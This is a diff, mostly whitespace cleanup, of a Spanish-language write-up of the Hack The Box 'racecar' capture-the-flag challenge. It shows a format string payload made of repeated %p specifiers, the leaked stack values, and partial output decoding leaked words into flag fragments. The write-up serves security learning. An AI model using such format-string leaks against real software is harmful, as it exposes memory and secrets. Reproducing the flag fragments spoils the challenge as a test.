@@ -26,8 +26,8 @@ Dentro del '.zip', encuentro unicamente un ejecutable 'racecar'.
 
 ```terminal
 /home/kali/Documents/htb/challenges/racecar:-$ file racecar
-racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically 
-linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, 
+racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically
+linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0,
 BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
 ```
 
@@ -47,7 +47,7 @@ Cuando ganas, te permite ingresar caracteres y luego vuelve a imprimirlos.
 
 ![](/assets/img/htb-writeup-racecar/racecar2.png)
 
-Analizando el código, encuentro que es vulnerable a un 'format string attack', como se indica en la línea 577 de 'Ghidra'. 
+Analizando el código, encuentro que es vulnerable a un 'format string attack', como se indica en la línea 577 de 'Ghidra'.
 
 También requiere un archivo llamado 'flag.txt', como se indica en la línea 566 de 'Ghidra'.
 
@@ -70,53 +70,53 @@ Después de hacer esto, volví a correr el ejecutable y esta vez, después de ga
 
 --------------------------------------------------------
       ______                                       |xxx|
-     /|_||_\`.__                                   | F |                                                                             
-    (   _    _ _\                                  |xxx|                                                                             
-*** =`-(_)--(_)-'                                  | I |                                                                             
-                                                   |xxx|                                                                             
-                                                   | N |                                                                             
-                                                   |xxx|                                                                             
-                                                   | I |                                                                             
-                                                   |xxx|                                                                             
-             _-_-  _/\______\__                    | S |                                                                             
-           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                                                             
-            _-_- `( o )----( o )-'                 | H |                                                                             
-                   `-'      `-'                    |xxx|                                                                             
---------------------------------------------------------                        
-                                                                                                                                     
-Insert your data:                                                                                                                    
-                                                                                                                                     
-Name: name                                                                                                                           
-Nickname: nick                                                                                                                  
-                                                                                                                                     
-[+] Welcome [name]!                                                                                                                  
-                                                                                                                                     
-[*] Your name is [name] but everybody calls you.. [nick]!                                                                       
+     /|_||_\`.__                                   | F |                                                                  
+    (   _    _ _\                                  |xxx|                                                                  
+*** =`-(_)--(_)-'                                  | I |                                                                  
+                                                   |xxx|                                                                  
+                                                   | N |                                                                  
+                                                   |xxx|                                                                  
+                                                   | I |                                                                  
+                                                   |xxx|                                                                  
+             _-_-  _/\______\__                    | S |                                                                  
+           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                                                  
+            _-_- `( o )----( o )-'                 | H |                                                                  
+                   `-'      `-'                    |xxx|                                                                  
+--------------------------------------------------------
+                                                                                                                          
+Insert your data:                                                                                                         
+                                                                                                                          
+Name: name                                                                                                                
+Nickname: nick                                                                                                            
+                                                                                                                          
+[+] Welcome [name]!                                                                                                       
+                                                                                                                          
+[*] Your name is [name] but everybody calls you.. [nick]!                                                                 
 [*] Current coins: [69]
 
 1. Car info
 2. Car selection
 > 2
-                                                                                                                                   
-Select car:                                                                                                                          
+                                                                                                                          
+Select car:                                                                                                               
 1.
 2.
 > 2
 
-Select race:                                                                                                                         
-1. Highway battle                                                                                                                    
-2. Circuit                                                                                                                           
-> 1                                                                                                                                  
-                                                                                                                                     
-[*] Waiting for the race to finish...                                                                                                
-                                                                                                                                     
-[+] You won the race!! You get 100 coins!                                                                                            
-[+] Current coins: [169]                                                                                                             
-                                                                                                                                     
-[!] Do you have anything to say to the press after your big victory?                       
+Select race:                                                                                                              
+1. Highway battle                                                                                                         
+2. Circuit                                                                                                                
+> 1                                                                                                                       
+                                                                                                                          
+[*] Waiting for the race to finish...                                                                                     
+                                                                                                                          
+[+] You won the race!! You get 100 coins!                                                                                 
+[+] Current coins: [169]                                                                                                  
+                                                                                                                          
+[!] Do you have anything to say to the press after your big victory?
 > %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 
-The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
+The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
 0x5725b200 0x170 0x56639dfa 0x60 0x6 0x26 0x2 0x1 0x5663a96c 0x5725b200 0x5725b380 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x414141 0x98fb6500 (nil) 0x5663cf8c 0xffb88558
 ```
 
@@ -181,7 +181,7 @@ b'd1d_'
 [+]
 15: b'0x34735f31\n'
 b'1_s4'
-[+] 
+[+]
 16: b'0x745f3376\n'
 b'v3_t'
 [+]
